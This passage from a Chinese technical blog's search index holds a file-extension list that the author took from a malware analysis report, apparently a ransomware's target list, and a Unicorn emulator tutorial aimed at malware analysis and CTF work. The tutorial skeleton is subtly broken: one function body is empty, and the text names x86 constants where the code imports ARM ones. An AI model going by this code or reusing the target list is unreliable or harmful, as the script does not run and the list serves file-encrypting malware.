href="http://www.huwei.tech/2016/07/07/Android-BLE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#%E4%BA%94%E3%80%81%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5" target="_blank" rel="noopener">http://www.huwei.tech/2016/07/07/Android-BLE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#%E4%BA%94%E3%80%81%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5</a></li><li><a href="https://www.race604.com/gatt-profile-intro/" target="_blank" rel="noopener">https://www.race604.com/gatt-profile-intro/</a></li></ol>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>文件后缀名枚举</title>
      <link href="/2018/03/15/%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80%E5%90%8D%E6%9E%9A%E4%B8%BE/"/>
      <url>/2018/03/15/%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80%E5%90%8D%E6%9E%9A%E4%B8%BE/</url>
      
        <content type="html"><![CDATA[<p>从一份恶意代码分析报告中抽取得，冥冥之中觉得以后有用，收藏以备用。</p><p>.000 .001 .1 .101 .103 .108 .110 .123 .128 .1cd .1sp .1st .3 .3d .3d4 .3dd .3df .3df8 .3dm .3dr .3ds .3dxml .3fr .3g2 .3ga .3gp .3gp2 .3mm .3pr .3w .4w7 .602 .7z .7zip .8 .89t .89y .8ba .8bc .8be .8bf .8bi8 .8bl .8bs .8bx .8by .8li .8svx .8xt .9xt .9xy .a$v .a2c .aa .aa3 .aac .aaf .aah .aaui .ab4 .ab65 .abc .abk .abt .abw .ac2 .ac3 .ac5 .acc .accdb .accde .accdr .accdt .ace .acf .ach .acp .acr .acrobatsecuritysettings .acrodata .acroplugin .acrypt .act .ad .ada .adb .adc .add .ade .adi .adoc .ados .adox .adp .adpb .adr .ads .adt .aea .aec .aep .aepx .aes .aet .afdesign .afm .afp .agd1 .agdl .age3rec .age3sav .age3scn .age3xrec .age3xsav .age3xscn .age3yrec .age3ysav .age3yscn .ahf .ai .aif .aiff .aim .aip .ais .ait .ak .al .al8 .ala .alb3 .alb4 .alb5 .alb6 .ald .ali .allet .alt3 .alt5 .amf .aml .amr .amt .amu .amx .amxx .anl .ann .ans .ansr .anx .aoi .ap .apa .apd .ape .apf .api .apj .apk .apnx .apo .app .approj .apr .apt .apw .apxl .arc .arch00 .arff .ari .arj .aro .arr .ars .arw .as .as$ .as3 .asa .asc .ascm .ascx .asd .ase .asf .ashx .ask .asl .asm .asmx .asn .asnd .asp .aspx .asr .asset .ast .asv .asvx .asx .ath .atl .atomsvc .atw .automaticdestinations-ms .aux .av .avi .avn .avs .awd .awe .awg .awp .aws .awt .aww .awwp .ax .azf .azs .azw .azw1 .azw3 .azw4 .b .b27 .b2a .back .backup .backupdb .bad .bak .bak~ .bamboopaper .bank .bar .bau .bax .bay .bbcd .bbl .bbprojectd .bbs .bbxt .bc5 .bc6 .bc7 .bcd .bck .bcp .bdb .bdb2 .bdp .bdr .bdt2 .bdt3 .bean .bfa .bgt .bgv .bi8 .bib .bibtex .bic .big .bik .bil .bin .bina .bizdocument .bjl .bk .bk! .bk1 .bk2 .bk3 .bk4 .bk5 .bk6 .bk7 .bk8 .bk9 .bkf .bkg .bkp .bks .bkup .bld .blend .blend2 .blg .blk .blm .blob .blp .bmc .bmf .bmk .bml .bmm .bmml .bmp .bmpr .bna .boc .book .bop .bp1 .bp2 .bp3 .bpf .bpk .bpl .bpm .bpmc .bps .bpw .brd .breaking_bad .brh .brl .brs .brx .bsa .bsk .bso .bsp .bst .btd .btf .btoa .btx .burn .burntheme .bvd .bwd .bwf .bwp .bxx .bzabw .c .c2e .c6 .cadoc .cae .cag .calca .cam .camproj .cap .capt .car .caro .cas .cat .catproduct .cawr .cbf .cbor .cbr .cbz .cc .ccc .ccd .ccf .cch .ccitt .cd .cd1 .cd2 .cdc .cdd .cddz .cdf .cdi .cdk .cdl .cdm .cdml .cdmm .cdmz .cdpz .cdr .cdr3 .cdr4 .cdr5 .cdr6 .cdrw .cds .cdt .cdtx .cdx .cdxml .ce1 .ce2 .cef .cer .cert .cf5 .cfd .cfg .cfp .cfr .cgf .cgfiletypetest .cgi .cgm .cgp .chi .chk .chm .chml .chmprj .chp .chpscrap .cht .chtml .cib .cida .cif .cipo .civ4worldbuildersave .civbeyondswordsave .cl2arc .cl2doc .clam .clarify .class .clb .clkd .clkt .clp .clr .cls .clx .cmf .cml .cmp .cms .cmt .cmu .cnf .cng .cnt .cnv .cod .col .comicdoc .comiclife .compositionmodel .compositiontemplate .con .conf .config .contact .converterx .cp .cpc .cpd .cpdt .cphd .cpi .cpio .cpp .cpy .cr2 .crashed .craw .crb .crd .creole .cri .crjoker .crs .crs3 .crt .crtr .crw .crwl .crypt .crypted .cryptowall .cryptra .cs .cs8 .csa .cse .csh .csi .csl .cso .csp .csr .css .cst .csv .ctbl .ctd .cte .ctf .ctl .ctt .ctxt .cty .cue .current .cvj .cvl .cvw .cw3 .cwf .cwk .cwn .cwr .cws .cwwp .cyi .cys .d .d3dbsp .dac .dadx .dag .dal .dap .das .dash .dat .database .datx .dayzprofile .dazip .db .db_journal .db0 .db3 .dba .dbb .dbc .dbf .dbfv .db-journal .dbk .dbr .dbs .dbx .dc2 .dc4 .dca .dcd .dcf .dch .dco .dcp .dcr .dcs .dct5 .dcu .ddc .ddcx .ddd .ddif .ddoc .ddrw .dds .deb .debian .dec .ded .default .del .dem .der .des .desc .description .design .desklink .det .deu .dev .dex .dfe .dfl .dfm .dft .dfti .dgc .dgm .dgpd .dgr .dgrh .dgs .dhe .dic .did .dif .dii .dim .dime .dip .dir .directory .disc .disco .disk .dit .divx .diz .djbz .djv .djvu .dk@p .dlc .dlg .dmbk .dmg .dmp .dmtemplate .dmv .dna .dng .dnl .dob .doc .doc# .docb .doce .docenx .dochtml .docl .docm .docmhtml .docs .docset .docstates .doct .documentrevisions-v100 .docx .docxl .docxml .dok .dot .dothtml .dotm .dotmenx .dotx .dotxenx .dox .doxy .doz .dp .dpd .dpi .dpk .dpl .dpr .drd .dream .drf .drm .drmx .drmz .drw .dsc .dsd .dsdic .dsf .dsg .dsk .dsl .dsn .dsp .dsy .dtd .dtm .dtml .dtp .dtx .dump .dvb .dvd .dvi .dvs .dvx .dvz .dwd .dwdoc .dwf .dwfx .dwg .dwlibrary .dwp .dwt .dxb .dxd .dxe .dxf .dxg .dxn .dxr .dxstudio .dzp .e3s .e4a .easmx .ebk .ebs .ec4 .ecc .ecr .edb .edd .edf .edl .edml .edn .edoc .edrwx .edt .edz .efa .efax .eff .efl .efm .efr .eftx .efu .efx .egr .egt .ehp .eif .eip .ekm .el6 .eld .elf .elfo .eln .emc .emf .eml .emlxpart .emm .enc .enciphered .encrypted .enfpack .ent .enx .enyd .eob .eot .ep .epdf .epf .epk .eprtx .eps .epsf .ept .epub .eql .erbsql .erd .ere .erf .err .es .es3 .esc .esd .esf .esm .esp .ess .esv .et .ete .etng .etnt .ets .etx .euc .evo .evy .ewl .ex .exc .exd .exf .exif .exprwdhtml .exprwdxml .exx .ez .ezc .ezm .ezs .ezz .f4v .f90 .f96 .fac .fadein .fae .faq .fax .fbd .fbp6 .fbs .fcd .fcf .fcstd .fd .fdb .fdf .fdoc .fdr .fds .fdseq .fdw .fdx .fed .feed-ms .feedsdb-ms .ff .ffa .ffd .ffdata .fff .ffl .ffo .fft .ffx .fh .fhd .fig .fin .fl .fla .flac .flag .flat .flf .flib .flka .flkb .flm .flp .fls .flt .fltr .flv .flvv .fly .fm .fm3 .fmc .fmd .fmf .fml .fmp .fmp3 .fnf .fo .fodg .fodp .fods .fodt .folio .for .forge .fos .fountain .fp .fpage .fpdoclib .fpenc .fphomeop .fpk .fplinkbar .fpp .fpt .fpx .fra .frag .frdat .frdoc .freepp .frelf .frm .fs .fsc .fsd .fsf .fsh .fsp .fss .ft10 .ft11 .ft7 .ft8 .ft9 .ftil .ftr .fwk .fwtemplate .fxd .fxg .fxo .fxr .fzh .fzip .ga3 .gam .gan .gcsx .gct .gdb .gdc .gdoc .ged .gev .gevl .gfe .gform .gfx .ggb .ghe .gho .gif .gil .giw .glink .glk .glo .glos .gly .gml .gmp .gnd .gno .gofin .gp4 .gpd .gpf .gpg .gpn .gpx .gpz .gra .grade .gray .grey .grf .grk .grle .groups .gry .gs .gsa .gsf .gsheet .gslides .gsm .gthr .gui .gul .gvi .gxk .gxl .gz .gzig .gzip .h .h1q .h1s .h1w .h2o .h3m .h4r .haml .hbk .hbl .hbx .hcl .hcw .hda .hdd .hdl .hdt .hdx .hed .help .helpindex .hex .hfd .hft .hhs .hkdb .hkx .hlf .hlp .hlx .hlx2 .hlz .hm2 .hmskin .hnd .hoi4 .hot .hp2 .hpd .hpj .hplg .hpo .hpp .hps .hpt .hpw .hqx .hrx .hs .hsm .hsx .hta .htm .htm~ .html .htmls .htmlz .htms .htpasswd .htz5 .hvpl .hw3 .hwp .hwpml .hwt .hxe .hxi .hxq .hxr .hxs .hyp .hype .iab .iaf .ial .ibank .ibcd .ibd .ibk .ibz .icalevent .icaltodo .icc .icml .icmt .ico .ics .icst .icxs .idap .idc .idd .idl .idml .idp .idx .ie5 .ie6 .ie7 .ie8 .ie9 .iff .ifp .ign .igr .ihf .ihp .iif .iiq .iks .ila .ildoc .img .imp .imr .incp .incpas .ind .indb .indd .indl .indp .indt .inf .info .ink .inld .inlk .inp .inprogress .inrs .inss .installhelper .insx .internetconnect .inx .ioca .iof .ipa .ipf .ipr .ish1 .ish2 .ish3 .iso .ispx .isu .isz .itdb .ite .itl .itm .itmz .itp .its .ivt .iw44 .iwa .iwd .iwi .iwprj .iwtpl .ix .ixv .jac .jar .jav .java .jb2 .jbc .jbig .jbig2 .jc .jdd .jfif .jge .jgz .jhd .jiaf .jias .jif .jiff .jnt .joe .jp1 .jpc .jpe .jpeg .jpf .jpg .jpgx .jpm .jpw .jrf .jrl .jrprint .js .jsd .json .jsp .jspa .jspx .jtd .jtdc .jtt .jtx .just .jw .jwl .jww .k25 .kbd .kbf .kc2 .kdb .kdbx .kdc .kde .kdf .kes .key .keynote .key-tef .kf .kfm .kfp .kid .klq .klw .kmz .knt .kos .kpdx .kpr .ksd .ksp .kss .ksw .kuip .kwd .kwm .kwp .laccdb .lastlogin .lat .latex .lax .lay .lay6 .layout .lbf .lbi .lbl .lcd .lcf .lcn .ldb .ldf .lfe .lgp .lhd .lib .lit .litemod .ll3 .llv .lmd .lngttarch2 .lnk .localstorage .log .logonxp .lok .lot .lp .lp2 .lp7 .lpa .lpc .lpd .lpdf .lpx .lrf .ls5 .lst .ltcx .ltm .ltr .ltx .lua .lvd .lvivt .lvl .lvw .lwd .lwo .lwp .lyx .m .m13 .m14 .m2 .m2ts .m3u .m3u8 .m4a .m4p .m4u .m4v .m7p .maca .mag .maker .maml .man .manu .map .mapimail .marc .markdn .mars .mass .max .maxfr .maxm .mbbk .mbox .mbx .mc9 .mcd .mcdx .mcf .mcgame .mcmac .mcmeta .mcrp .mcw .md .md0 .md1 .md2 .md3 .md5 .mdb .mdbackup .mdbhtml .mdc .mdccache .mddata .mdf .mdg .mdi .mdk .mdl .mdn .mds .mecontact .med .mef .meh .mell .mellel .menu .meo .met .metadata_never<em>index .mf .mfa .mfp .mfw .mga .mgmt .mgourmet .mgourmet3 .mhp .mht .mhtenx .mhtmlenx .mi .mic .mid .mif .mim .mime .mindnode .mip .mission .mix .mjd .mjdoc .mke .mkv .mla .mlb .mlj .mlm .mls .mlsxml .mlx .mm .mm6 .mm7 .mm8 .mmap .mmc .mmd .mme .mmjs .mml .mmo .mmsw .mmw .mny .mo .mobi .mod .moneywell .mos .mov .movie .moz .mp1 .mp2 .mp3 .mp4 .mp4v .mpa .mpe .mpeg .mpf .mpg .mph .mpj .mpq .mpqge .mpr .mpt .mpv .mpv2 .mrd .mru .mrw .mrwref .ms .msd .mse .msg .mshc .msi .msie .msl .mso .msor .msp .msq .ms-tnef .msw .mswd .mtdd .mtml .mto .mtp .mts .mtx .mug .mui .mvd .mvdx .mvex .mwd .mwii .mwpd .mwpp .mws .mxd .mxg .mxp .myd .mydocs .myi .mz .n3 .narrative .nav .navmap .nb .nbak .nbf .nbp .ncd .ncf .nd .ndd .ndf .ndl .ndr .nds .ne1 .ne3 .nef .nfo .nfs11save .ng .njx .nk2 .nmbtemplate .nmu .nokogiri .nop .note .now .npd .npdf .npp .npt .nrbak .nrg .nri .nrl .nrmlib .nrw .ns2 .ns3 .ns4 .nsd .nsf .nsg .nsh .nst .ntf .ntl .ntp .nts .number .numbers .nvd .nvdl .nvram .nwb .nwbak .nwcab .nwcp .nx^d .nx__ .nx1 .nx2 .nxl .nyf .oa2 .oa3 .oab .oad .oas .obd .obj .obr .obt .obx .obz .ocdc .ocs .oda .odb .odc .odccubefile .odf .odg .odh .odi .odif .odm .odo .odp .ods .odt .odt# .odttf .odz .officeui .ofn .oft .oga .ogc .ogg .oil .ojz .okm .ole .ole2 .olf .olv .oly .omlog .omp .onb .one .oos .oot .opd .opf .opj .oplx .opn .opt .opx .opxs .orf .ort .osd .osdx .ost .otc .otf .otg .oth .oti .otn .otp .ots .ott .otw .out .ovd .owl .oxps .oxt .p10 .p12 .p2s .p3x .p65 .p7b .p7c .p7z .pab .pack .pad .pages .pages-tef .pak .paq .pas .pat .paux .pbd .pbf .pbk .pbp .pbr .pbs .pbx5script .pbxscript .pcd .pcf .pcj .pct .pcv .pcw .pd .pdb .pdc .pdcr .pdd .pdf .pdf</em> .pdf_profile .pdf_tsid .pdfa .pdfe .pdfenx .pdfl .pdfua .pdfvt .pdfx .pdfxml .pdfz .pdg .pdp .pdz .peb .pef .pem .pez .pf .pfc .pfd .pfl .pfm .pfsx .pft .pfx .pg .pgs .php .phr .phs .pih .pixexp .pj2 .pj4 .pj5 .pk .pkb .pkey .pkg .pkh .pkpass .pl .plan .plb .plc .pld .pli .pln .plus_muhd .pm .pm3 .pm4 .pm5 .pm6 .pm7 .pmd .pmt .pmv .pmx .png .pnu .po .pod .pool .pot .pothtml .potm .potx .pp3 .ppam .ppd .ppdf .ppf .ppj .ppp .pps .ppsenx .ppsm .ppsx .ppt .ppte .ppthtml .pptl .pptm .pptmhtml .pptt .pptx .ppws .ppx .prc .prd .pref .prel .prf .prj .prn .pro .pro4 .pro4dvd .pro5 .pro5dvd .pro5plx .pro5x .proofingtool .props .proqc .prproj .prr .prs .prt .prtc .prv .ps .ps2 .ps3 .psa .psafe3 .psb .psd .pse8db .psf .psg .psi2 .psip .psk .psm .psmd .pspimage .pst .psw .psw6 .pswx .psz .pt3 .pt6 .ptc .ptf .pth .ptk .ptn .ptn2 .pts .ptx .pub .pubf .pubhtml .pubmhtml .pubx .puz .pvd .pve .pvf .pw .pwd .pwe .pwf .pwi .pwm .pwp .pwre .pxd .pxl .pxp .py .pys .pzc .pzf .pzt .qba .qbb .qbl .qbm .qbr .qbw .qbx .qby .qch .qcow .qcow2 .qct .qdf .qed .qel .qfl .qfxx .qhp .qht .qhtm .qic .qif .qlgenerator .qpx .qrt .qt .qtq .qtr .qtw .quox .qvw .qwd .qwt .qxb .qxd .qxl .qxp .qxt .r00 .r01 .r02 .r03 .r0f .r0z .r3d .ra .ra2 .raf .ram .ramd .rap .rar .rat .raw .razy .rb .rbc .rcb .rd .rd1 .rdb .rdf .rdfs .rdi .rdo .rdoc .rdoc<em>options .rdz .re4 .rec .rels .res .resbuild .rest .result .rev .rf .rf1 .rft .rgn .rgo .rgss3a .rha .rhif .rim .rit .rlf .rll .rm .rm5 .rmd .rmf .rmh .rna .rng .rnt .rnw .ro3 .rofl .roi .ros .rov .row .rox .rpf .rpt .rptr .rrd .rrpa .rrt .rrx .rs .rsdf .rsdoc .rsm .rsp .rsrc .rst .rsw .rt .rt</em> .rtdf .rte .rtf .rtf_ .rtfd .rtk .rtpi .rts .rtsl .rtsx .rtx .rum .run .rv .rvf .rvt .rw2 .rwl .rwlibrary .rwz .rxdoc .rzk .rzx .s3db .s8bn .sa5 .sa7 .sa8 .saas .sad .saf .safe .safetext .sam .sas7bdat .sav .save .say .sb .sbn .sbo .sbpf .sbsc .sbst .sc2save .scd .scdoc .sce .sch .scm .scmt .scn .scr .scriv .scrivx .scs .scspack .scssc .sct .scw .scx .sd .sd0 .sd1 .sda .sdb .sdc .sdd .sddraft .sdf .sdi .sdl .sdmdocument .sdn .sdo .sdoc .sdp .sdr .sds .sdt .sdv .sdw .search-ms .secure .sef .sel .sen .seq .sequ .server .ses .set .setup .sev .sff .sfs .sfx .sgf .sgi .sgl .sgm .sgml .sgz .sh .sh6 .shar .shb .show .shr .shs .shtml .shw .shy .sic .sid .sidd .sidn .sie .sik .sis .sky .sla .sldm .sldx .slf .slk .slm .slt .slz .sm .smd .sme .smf .smh .smlx .smn .smp .sms .smwt .smx .smz .snb .snf .sng .snk .snp .snt .snx .so .soi .spb .spd .spdf .spk .spl .spm .spml .sppt .spr .sprt .sprz .sql .sqlite .sqlite3 .sqlitedb .sqllite .sqx .sr2 .src .srf .srfl .srs .srt .srw .ssa .ssh .ssi .ssiw .ssm .ssx .st4 .st5 .st6 .st7 .st8 .stc .std .sti .stm .stp .stpz .struct .stt .stw .stx .stxt .sty .sud .suf .sum .surf .svd .svdl .svg .svi .svm .svn .svp .svr .svs .swd .swdoc .sweb .swf .switch .swp .sxc .sxd .sxe .sxg .sxi .sxl .sxm .sxml .sxw .syn .syncdb .t .t01 .t03 .t05 .t10 .t12 .t13 .t14 .t2 .t2k .t2t .t4g .t80 .ta1 .ta2 .ta9 .tabula-doc .tabula-docstyle .tah .tar .tax .tax2009 .tax2013 .tax2014 .tb .tbb .tbd .tbk .tbkx .tbz2 .tcd .tch .tck .tcx .tdg .tdl .tdoc .tdr .te1 .template .tex .texi .texinfo .text .textclipping .textile .tfd .tfm .tfr .tfrd .tg .tga .tgz .thm .thml .thmx .thr .tib .tif .tiff .tjp .tk3 .tlb .tld .tlg .tlt .tlx .tlz .tm .tm3 .tmb .tmd .tml .tmlanguage .tmv .tmz .tns .tnsp .toast .toc .topx .tor .torrent .totalslayout .tp .tpl .tpo .tpsdb .tpu .tpx .trashinfo .trif .trp .ts .tsc .tt11 .tt2 .ttax .ttxt .tu .tur .tvd .twdi .twdx .tww .tx .txd .txe .txf .txm .txn .txt .txtrpt .u3d .uax .ubz .ucd .udb .udf .udl .uea .uhtml .ukr .ulf .uli .ulys .ump .umx .unity3d .unr .unx .uof .uop .uos .uot .updf .upk .upoi .upp .urd-journal .urf .url .urp .usa .usx .ut2 .ut3 .utc .utd .ute .utf8 .uti .utm .uts .utx .uu .uud .uue .uvx .uxx .v .v2t .val .vault .vbadoc .vbd .vbk .vbox .vbs .vc .vcal .vcd .vce .vcf .vdf .vdi .vdo .vdoc .vdt .ver .vf .vfs0 .vhd .vhdx .view .viz .vlc .vlt .vmbx .vmdk .vmf .vmg .vmm .vmsd .vmt .vmx .vmxf .vob .voprefs .vor .vp .vpk .vpl .vpp_pc .vs .vsd .vsdx .vsf .vsi .vspolicy .vst .vstx .vtf .vthought .vtv .vtx .vw .vw3 .w .w2p .w3g .w3x .w51 .w52 .w60 .w61 .w6bn .w6w .w8bn .w8tn .wab .wad .waff .wallet .war .wav .wave .waw .wb .wb2 .wb3 .wbk .wbt .wbxml .wbz .wcf .wcl .wcn .wcp .wcst .wd0 .wd1 .wd2 .wdbn .wdgt .wdl .wdn .wdoc .wdx9 .web .webdoc .webpart .wep .wflx .wht .wiz .wk! .wk1 .wk3 .wk4 .wkb .wki .wkl .wks .wlb .wld .wll .wls .wlxml .wm .wma .wmd .wmdb .wmf .wmga .wmk .wml .wmlc .wmmp .wmo .wms .wmv .wmx .wn .wolf .word .wordlist .wotreplay .wow .wp .wp42 .wp5 .wp50 .wp6 .wp7 .wpa .wpc2 .wpd .wpd0 .wpd1 .wpd2 .wpd3 .wpe .wpf .wpk .wpl .wpost .wps .wpt .wpw .wr1 .wrf .wri .wrlk .ws .ws1 .ws2 .ws3 .ws4 .ws5 .ws6 .ws7 .wsd .wsf .wsh .wsp .wtbn .wtd .wtf .wtmp .wtp .wts .wtt .wtx .wvw .wvx .wwcx .wwi .wwl .wws .wwt .wxmx .wxp .wyn .wzn .wzs .x11 .x16 .x3f .x3g .xamlx .xar .xav .xbd .xbrl .xci .xda .xdc .xdf .xdo .xdoc .xdw .xf .xfd .xfdf .xfi .xfl .xfn .xfo .xfp .xfx .xgml .xht .xhtm .xhtml .xif .xig .xis .xjf .xl .xla .xlam .xlb .xlc .xle .xlf .xline .xlist .xlk .xll .xlm .xlnk .xlr .xls .xlsb .xlse .xlshtml .xlsl .xlsm .xlst .xlsx .xlsxl .xlt .xlthtml .xltm .xltx .xlv .xlw .xlwx .xma .xmdf .xml .xmmap .xmn .xmp .xms .xmt_bin .xmta .xpd .xpi .xpm .xps .xpse .xpt .xpwe .xqm .xqr .xqx .xrdml .xsc .xsd .xsig .xsl .xslt .xtbl .xtd .xtg .xtml .xtps .xtrl .xv0 .xv2 .xv3 .xvg .xvid .xvl .xwd .xweb3htm .xweb3html .xweb4stm .xweb4xml .xwf .xwp .xxe .xxx .xy .xy3 .xy4v .xyd .yab .ycbcra .yenc .yml .ync .yps .yuv .z02 .z04 .zap .zip .zipx .zoo .zps .ztmp</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>Unicorn使用</title>
      <link href="/2018/03/15/Unicorn%E4%BD%BF%E7%94%A8/"/>
      <url>/2018/03/15/Unicorn%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="Unicore简介"><a href="#Unicore简介" class="headerlink" title="Unicore简介"></a>Unicore简介</h2><ol><li>Unocorn引擎是什么?</li></ol><p>简单的来讲，一款模拟器。尽管不太常见，你不能用来模拟整个程序或者系统，同时它也不支持syscall。你只能通过手动的方式来映射内存以及数据写入，然后就可以从某个指定的地址开始执行模拟了。</p><ol><li>用途</li></ol><p>执行一些恶意软件中你感兴趣的函数而不必创建整个进程<br>CTF比赛中也很常用<br>Fuzzing[<a href="https://hackernoon.com/afl-unicorn-fuzzing-arbitrary-binary-code-563ca28936bf" target="_blank" rel="noopener">https://hackernoon.com/afl-unicorn-fuzzing-arbitrary-binary-code-563ca28936bf</a>]<br>GDB插件扩充，例如支持长跳转<br>模拟混淆后的代码</p><h2 id="框架代码"><a href="#框架代码" class="headerlink" title="框架代码"></a>框架代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">from unicorn import *</span><br><span class="line">from unicorn.arm_const import *</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">import struct</span><br><span class="line"> </span><br><span class="line">def read(name):</span><br><span class="line">    with open(name) as f:</span><br><span class="line">        return f.read()</span><br><span class="line"> </span><br><span class="line">def u32(data):</span><br><span class="line">    return struct.unpack(&quot;I&quot;, data)[0]</span><br><span class="line"> </span><br><span class="line">def p32(num):</span><br><span class="line">    return struct.pack(&quot;I&quot;, num)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">mu = Uc (UC_ARCH_ARM, UC_MODE_LITTLE_ENDIAN)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">BASE = 0x10000</span><br><span class="line">STACK_ADDR = 0x300000</span><br><span class="line">STACK_SIZE = 1024*1024</span><br><span class="line"> </span><br><span class="line">mu.mem_map(BASE, 1024*1024)</span><br><span class="line">mu.mem_map(STACK_ADDR, STACK_SIZE)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">mu.mem_write(BASE, read(&quot;./task4&quot;))</span><br><span class="line">mu.reg_write(UC_ARM_REG_SP, STACK_ADDR + STACK_SIZE/2)</span><br><span class="line"> </span><br><span class="line">instructions_skip_list = []</span><br><span class="line"> </span><br><span class="line">CCC_ENTRY = 0x000104D0</span><br><span class="line">CCC_END = 0x00010580</span><br><span class="line"> </span><br><span class="line">stack = []                                          # Stack for storing the arguments</span><br><span class="line">d = &#123;&#125;                                              # Dictionary that holds return values for given function arguments</span><br><span class="line"> </span><br><span class="line">def hook_code(mu, address, size, user_data): </span><br><span class="line">    #print(&apos;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&apos; %(address, size))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">mu.hook_add(UC_HOOK_CODE, hook_code)</span><br><span class="line"> </span><br><span class="line">mu.emu_start(0x00010584, 0x000105A8)</span><br><span class="line"> </span><br><span class="line">return_value = mu.reg_read(UC_ARM_REG_R1)           # We end the emulation at printf(&quot;%d\n&quot;, ccc(x)).</span><br><span class="line">print &quot;The return value is %d&quot; % return_value</span><br></pre></td></tr></table></figure><p>from unicorn import <em> —— 加载主Unicorn库，它包含函数和基本Constant。<br>from unicorn.x86_const import </em> —— 加载特定于x86和x86-64架构的Constant。<br>Unicorn模块中的所有Const如下：</p><blockquote><blockquote><blockquote><p>UC_API_MAJOR                UC_ERR_VERSION              UC_MEM_READ                 UC_PROT_ALL<br>UC_API_MINOR                UC_ERR_WRITE_PROT           UC_MEM_READ_AFTER           UC_PROT_EXEC<br>UC_ARCH_ARM                 UC_ERR_WRITE_UNALIGNED      UC_MEM_READ_PROT            UC_PROT_NONE<br>UC_ARCH_ARM64               UC_ERR_WRITE_UNMAPPED       UC_MEM_READ_UNMAPPED        UC_PROT_READ<br>UC_ARCH_M68K                UC_HOOK_BLOCK               UC_MEM_WRITE                UC_PROT_WRITE<br>UC_ARCH_MAX                 UC_HOOK_CODE                UC_MEM_WRITE_PROT           UC_QUERY_MODE<br>UC_ARCH_MIPS                UC_HOOK_INSN                UC_MEM_WRITE_UNMAPPED       UC_QUERY_PAGE_SIZE<br>UC_ARCH_PPC                 UC_HOOK_INTR                UC_MILISECOND_SCALE         UC_SECOND_SCALE<br>UC_ARCH_SPARC               UC_HOOK_MEM_FETCH           UC_MODE_16                  UC_VERSION_EXTRA<br>UC_ARCH_X86                 UC_HOOK_MEM_FETCH_INVALID   UC_MODE_32                  UC_VERSION_MAJOR<br>UC_ERR_ARCH                 UC_HOOK_MEM_FETCH_PROT      UC_MODE_64                  UC_VERSION_MINOR<br>UC_ERR_ARG                  UC_HOOK_MEM_FETCH_UNMAPPED  UC_MODE_ARM                 Uc<br>UC_ERR_EXCEPTION            UC_HOOK_MEM_INVALID         UC_MODE_BIG_ENDIAN          UcError<br>UC_ERR_FETCH_PROT           UC_HOOK_MEM_PROT            UC_MODE_LITTLE_ENDIAN       arm64_const<br>UC_ERR_FETCH_UNALIGNED      UC_HOOK_MEM_READ            UC_MODE_MCLASS              arm_const<br>UC_ERR_FETCH_UNMAPPED       UC_HOOK_MEM_READ_AFTER      UC_MODE_MICRO               debug<br>UC_ERR_HANDLE               UC_HOOK_MEM_READ_INVALID    UC_MODE_MIPS3               m68k_const<br>UC_ERR_HOOK                 UC_HOOK_MEM_READ_PROT       UC_MODE_MIPS32              mips_const<br>UC_ERR_HOOK_EXIST           UC_HOOK_MEM_READ_UNMAPPED   UC_MODE_MIPS32R6            sparc_const<br>UC_ERR_INSN_INVALID         UC_HOOK_MEM_UNMAPPED        UC_MODE_MIPS64              uc_arch_supported<br>UC_ERR_MAP                  UC_HOOK_MEM_VALID           UC_MODE_PPC32               uc_version<br>UC_ERR_MODE                 UC_HOOK_MEM_WRITE           UC_MODE_PPC64               unicorn<br>UC_ERR_NOMEM                UC_HOOK_MEM_WRITE_INVALID   UC_MODE_QPX                 unicorn_const<br>UC_ERR_OK                   UC_HOOK_MEM_WRITE_PROT      UC_MODE_SPARC32             version_bind<br>UC_ERR_READ_PROT            UC_HOOK_MEM_WRITE_UNMAPPED  UC_MODE_SPARC64             x86_const<br>UC_ERR_READ_UNALIGNED       UC_MEM_FETCH                UC_MODE_THUMB<br>UC_ERR_READ_UNMAPPED        UC_MEM_FETCH_PROT           UC_MODE_V8<br>UC_ERR_RESOURCE             UC_MEM_FETCH_UNMAPPED       UC_MODE_V9</p></blockquote></blockquote></blockquote><p>一些示例：</p><ul><li>mu = Uc(arch, mode) —— 获得一个Uc类的实例，在这里可以指定架构。<br>举例来说：<ul><li>mu = Uc(UC_ARCH_X86, UC_MODE_64) 获得一个x86-64架构的Uc实例。</li><li>mu = Uc(UC_ARCH_X86, UC_MODE_32) 获得一个x86-32架构的Uc实例。</li></ul></li><li>mu.mem_map(ADDRESS, 4096) 映射一个内存区域。</li><li>mu.mem_write(ADDRESS, DATA) 将数据写入内存。</li><li>tmp = mu.mem_read(ADDRESS, SIZE) 从内存中读取数据。</li><li>mu.reg_write(UC_X86_REG_ECX, 0x0) 将寄存器重新赋值。</li><li>r_esp = mu.reg_read(UC_X86_REG_ESP) 